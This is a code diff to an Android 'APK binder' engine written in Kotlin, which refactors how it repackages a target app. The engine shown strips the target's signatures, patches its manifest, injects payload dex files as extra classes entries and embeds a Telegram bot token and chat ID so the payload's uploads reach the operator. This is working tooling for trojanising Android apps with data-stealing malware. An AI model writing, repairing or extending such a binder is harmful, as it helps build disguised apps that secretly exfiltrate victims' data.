@@ -10,10 +10,10 @@ import Com.devhs.apkbinder.data.LogLevel
 import Com.devhs.apkbinder.data.PayloadConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStream
-import java.security.Certificate
 import java.security.KeyFactory
 import java.security.KeyPair
 import java.security.KeyPairGenerator
@@ -29,9 +29,8 @@ import java.util.Date
 import java.util.Locale
 import java.util.TimeZone
 import java.util.zip.CRC32
-import java.util.zip.ZipEntry
+import java.util.zip.Deflater
 import java.util.zip.ZipFile
-import java.util.zip.ZipOutputStream
 
 data class BindResult(
     val ok: Boolean,
@@ -92,8 +91,7 @@ class BinderEngine(private val context: Context) {
                 onLog(LogLevel.ERROR, "Payload dex not found in own APK")
                 return@withContext BindResult(false, "Payload dex missing")
             }
-            val payloadKb = payloadDexes.sumOf { it.size } / 1024
-            onLog(LogLevel.INFO, "Payload dexes: ${payloadDexes.size} (${payloadKb} KB)")
+            onLog(LogLevel.INFO, "Payload dexes: ${payloadDexes.size}")
 
             val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
             temps.add(temp)
@@ -130,44 +128,40 @@ class BinderEngine(private val context: Context) {
                 var slot = maxDexIndex(zip)
 
                 FileOutputStream(temp).use { fos ->
-                    CountingStream(fos).use { cs ->
-                        ZipOutputStream(cs).use { zos ->
+                    val zw = ZipWriter(fos)
 
-                            val entries = zip.entries()
-                            while (entries.hasMoreElements()) {
-                                val e = entries.nextElement()
-                                val name = e.name
+                    val entries = zip.entries()
+                    while (entries.hasMoreElements()) {
+                        val e = entries.nextElement()
+                        val name = e.name
 
-                                if (name == MANIFEST) continue
-                                if (name == "assets/" + Const.CONFIG_ASSET) continue
-                                if (isSignatureFile(name)) continue
+                        if (name == MANIFEST) continue
+                        if (name == "assets/" + Const.CONFIG_ASSET) continue
+                        if (isSignatureFile(name)) continue
 
-                                val data = zip.getInputStream(e).use { it.readBytes() }
-                                val stored = e.method == ZipEntry.STORED
-                                writeEntry(zos, cs, name, data, stored)
-                            }
-
-                            writeEntry(zos, cs, MANIFEST, patchedBytes, false)
-
-                            for (dex in payloadDexes) {
-                                slot++
-                                val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
-                                writeEntry(zos, cs, dexName, dex, false)
-                            }
-                            onLog(LogLevel.INFO, "Injected ${payloadDexes.size} dex files")
-
-                            if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
-                                val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
-                                writeEntry(
-                                    zos, cs, "assets/" + Const.CONFIG_ASSET,
-                                    json.toByteArray(), false
-                                )
-                                onLog(LogLevel.INFO, "Config injected")
-                            } else {
-                                onLog(LogLevel.WARN, "Config missing - uploads will fail")
-                            }
-                        }
+                        val data = zip.getInputStream(e).use { it.readBytes() }
+                        val stored = e.method == java.util.zip.ZipEntry.STORED
+                        zw.add(name, data, stored)
                     }
+
+                    zw.add(MANIFEST, patchedBytes, false)
+
+                    for (dex in payloadDexes) {
+                        slot++
+                        val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
+                        zw.add(dexName, dex, false)
+                    }
+                    onLog(LogLevel.INFO, "Injected ${payloadDexes.size} dex files")
+
+                    if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
+                        val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
+                        zw.add("assets/" + Const.CONFIG_ASSET, json.toByteArray(), false)
+                        onLog(LogLevel.INFO, "Config injected")
+                    } else {
+                        onLog(LogLevel.WARN, "Config missing - uploads will fail")
+                    }
+
+                    zw.finish()
                 }
             }
 
@@ -227,6 +221,129 @@ class BinderEngine(private val context: Context) {
                 }
             }
         }
+    }
+
+    // ------------------------------------------------------------------
+    // ZIP writer (offsets tracked correctly, alignment via extra field)
+    // ------------------------------------------------------------------
+    private class CdEntry(
+        val name: ByteArray,
+        val method: Int,
+        val crc: Long,
+        val compSize: Int,
+        val size: Int,
+        val offset: Long
+    )
+
+    private inner class ZipWriter(private val out: OutputStream) {
+        private var pos: Long = 0L
+        private val cd = ArrayList<CdEntry>()
+
+        fun add(name: String, data: ByteArray, stored: Boolean) {
+            val crc = CRC32()
+            crc.update(data)
+            val payload = if (stored) data else deflate(data)
+            val method = if (stored) 0 else 8
+            val nameBytes = name.toByteArray(Charsets.UTF_8)
+
+            val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
+            val headerLen = 30 + nameBytes.size
+            val pad = paddingFor(pos + headerLen, align)
+
+            val offset = pos
+
+            writeInt(0x04034b50)
+            writeShort(20)
+            writeShort(0x0800)
+            writeShort(method)
+            writeShort(0)
+            writeShort(0x0021)
+            writeInt(crc.value.toInt())
+            writeInt(payload.size)
+            writeInt(data.size)
+            writeShort(nameBytes.size)
+            writeShort(pad)
+            writeBytes(nameBytes)
+            if (pad > 0) writeBytes(ByteArray(pad))
+            writeBytes(payload)
+
+            cd.add(CdEntry(nameBytes, method, crc.value, payload.size, data.size, offset))
+        }
+
+        fun finish() {
+            val cdStart = pos
+            for (e in cd) {
+                writeInt(0x02014b50)
+                writeShort(20)
+                writeShort(20)
+                writeShort(0x0800)
+                writeShort(e.method)
+                writeShort(0)
+                writeShort(0x0021)
+                writeInt(e.crc.toInt())
+                writeInt(e.compSize)
+                writeInt(e.size)
+                writeShort(e.name.size)
+                writeShort(0)
+                writeShort(0)
+                writeShort(0)
+                writeShort(0)
+                writeInt(0)
+                writeInt(e.offset.toInt())
+                writeBytes(e.name)
+            }
+            val cdSize = pos - cdStart
+
+            writeInt(0x06054b50)
+            writeShort(0)
+            writeShort(0)
+            writeShort(cd.size)
+            writeShort(cd.size)
+            writeInt(cdSize.toInt())
+            writeInt(cdStart.toInt())
+            writeShort(0)
+
+            out.flush()
+        }
+
+        private fun writeInt(v: Int) {
+            writeBytes(
+                byteArrayOf(
+                    (v and 0xFF).toByte(),
+                    ((v shr 8) and 0xFF).toByte(),
+                    ((v shr 16) and 0xFF).toByte(),
+                    ((v shr 24) and 0xFF).toByte()
+                )
+            )
+        }
+
+        private fun writeShort(v: Int) {
+            writeBytes(byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte()))
+        }
+
+        private fun writeBytes(b: ByteArray) {
+            out.write(b)
+            pos += b.size
+        }
+
+        private fun deflate(data: ByteArray): ByteArray {
+            val d = Deflater(Deflater.DEFAULT_COMPRESSION, true)
+            d.setInput(data)
+            d.finish()
+            val bos = ByteArrayOutputStream()
+            val buf = ByteArray(32 * 1024)
+            while (!d.finished()) {
+                val n = d.deflate(buf)
+                if (n > 0) bos.write(buf, 0, n)
+            }
+            d.end()
+            return bos.toByteArray()
+        }
+    }
+
+    private fun paddingFor(position: Long, align: Int): Int {
+        val rem = (position % align).toInt()
+        return if (rem == 0) 0 else align - rem
     }
 
     // ------------------------------------------------------------------
@@ -342,62 +459,6 @@ class BinderEngine(private val context: Context) {
         val upper = name.uppercase()
         return upper.endsWith(".RSA") || upper.endsWith(".DSA") ||
                 upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
-    }
-
-    private fun writeEntry(
-        zos: ZipOutputStream,
-        cs: CountingStream,
-        name: String,
-        data: ByteArray,
-        stored: Boolean
-    ) {
-        val e = ZipEntry(name)
-
-        if (stored) {
-            val crc = CRC32()
-            crc.update(data)
-            e.method = ZipEntry.STORED
-            e.size = data.size.toLong()
-            e.compressedSize = data.size.toLong()
-            e.crc = crc.value
-        } else {
-            e.method = ZipEntry.DEFLATED
-        }
-
-        zos.putNextEntry(e)
-        zos.write(data)
-        zos.closeEntry()
-        zos.flush()
-
-        val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
-        val pad = paddingFor(cs.count, align)
-        if (pad > 0) {
-            cs.write(ByteArray(pad))
-            cs.flush()
-        }
-    }
-
-    private fun paddingFor(position: Long, align: Int): Int {
-        val rem = (position % align).toInt()
-        return if (rem == 0) 0 else align - rem
-    }
-
-    private class CountingStream(private val out: OutputStream) : OutputStream() {
-        var count: Long = 0L
-            private set
-
-        override fun write(b: Int) {
-            out.write(b)
-            count++
-        }
-
-        override fun write(b: ByteArray, off: Int, len: Int) {
-            out.write(b, off, len)
-            count += len
-        }
-
-        override fun flush() = out.flush()
-        override fun close() = out.flush()
     }
 
     // ------------------------------------------------------------------
